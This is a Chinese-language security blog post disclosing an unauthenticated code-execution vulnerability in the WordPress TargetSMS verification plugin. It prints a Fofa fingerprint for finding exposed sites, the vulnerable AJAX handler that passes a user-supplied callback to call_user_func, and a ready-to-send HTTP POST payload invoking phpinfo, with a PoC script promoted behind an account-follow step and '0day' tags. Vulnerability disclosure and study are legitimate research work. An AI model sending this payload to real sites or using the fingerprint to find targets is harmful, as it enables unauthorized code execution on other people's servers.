#  WordPress TargetSMS 插件存在前台代码执行漏洞   
原创 Mstir  星悦安全   2025-05-08 08:26  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
TargetSMS 验证短信允许您通过向指定的电话号码发送带有确认代码的短信来实施验证。SMS 消息通过服务发送 在注册和/或密码恢复期间启用/禁用验证;指定确认码的长度;指定确认码的有效期;指定注册和/或密码恢复期间的短信文本;  
  
Fofa指纹:  
"wp-content/plugins/verification-sms-targetsms/"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c0pnVOIEDyfcqFT9sz1KBBytvLe9phkQ6luvp8l9iaiaqNicumYFDylMfkBBYicgp65m9iaLtrJZUXzXA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c0pnVOIEDyfcqFT9sz1KBBT9xtd3Zp8hy9TySymo54icyuOJWOz8ibiaeAbjR9mag7YWhL7gtNNTIUw/640?wx_fmt=png&from=appmsg "")  
  
📍 该漏洞由星群漏洞库自动化检索发现   
📍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c0pnVOIEDyfcqFT9sz1KBBs2D24FMOk24PuswdicY86zibuH2KhS2ic4Ovpgg9p4BLBnBNSWvYnAVyg/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
位于 /inc/ajax.php 中，存在call_user_func 函数，且传参callback均可控，action 也存在不需要授权的接口  
   
targetvrHHndler  
，导致代码执行漏洞产生.```
<?php/**  * Региструет функцию для обработки AJAX запросов.*/add_action('wp_ajax_nopriv_targetvrHHndler', 'targetvr_ajax_handler');function targetvr_ajax_handler(){ $callback = targetvr_get_postData('callback', 'string'); if ($callback and function_exists($callback)){  call_user_func($callback); } else {  targetvr_return_json(false); } wp_die();}
```  
  
  
Payload:```
POST /wp-admin/admin-ajax.php HTTP/2Host: 127.0.0.1Content-Length: 39Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://127.0.0.1/wp-admin/admin-ajax.php?cmd=whoamiAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Priority: u=0, iaction=targetvrHHndler&callback=phpinfo
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c0pnVOIEDyfcqFT9sz1KBBNVD6aiaVoK1MFUXhdldDlHUKGvW4cJibFER2ulV5TjqbFViaR0GClMwXQ/640?wx_fmt=png&from=appmsg "")  
  
POC脚本:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c0pnVOIEDyfcqFT9sz1KBBOCLbfQnV0ZNBS2MQicIO6oG6bUP2utWzsGj8sic9u68hflBcIungum7g/640?wx_fmt=png&from=appmsg "")  
## 0x02 脚本下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
  
**POC脚本关注公众号，发送 250508 获取!**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
